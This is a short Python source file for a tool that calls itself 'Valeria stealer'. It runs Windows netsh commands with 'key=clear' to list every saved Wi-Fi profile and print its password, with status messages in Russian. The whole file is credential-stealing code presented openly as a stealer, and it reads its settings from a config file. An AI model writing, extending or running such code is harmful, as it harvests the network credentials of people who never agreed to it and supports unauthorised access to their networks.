
import subprocess 

config_data = [" ", " " , " "," "] # it will put data from config here 
counter = 0

def detect_wifi_passwords(codec , language):
    profiles_data =  subprocess.check_output('netsh wlan show profiles').decode(codec).split('\n')
    if language == "Russian":
        profiles = [i.split(':')[1].strip() for i in profiles_data if 'Все профили пользователей' in i]

        for profile in profiles:
            profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear' ).decode(codec).split('\n')
            if profile_info == 1:
                print("Valeria stealer : Вы не были авторизированны в этой сети")
            try:
                password =[i.split(':')[1].strip() for i in profile_info if 'Содержимое ключа' in i][0]
            except IndexError:
                password = "Valeria stealer returns ERROR : Ключ безопасности не получен "
            
            print(f'Valeria stealer обнаружила профиль{profile} и пароль {password} ')

#**********main code**********

#get data from config             
with open ("config.txt") as f:
    for line in f:
        config_data[counter] =line.rstrip()
        counter+=1
        
    

detect_wifi_passwords(config_data[0],config_data[1])


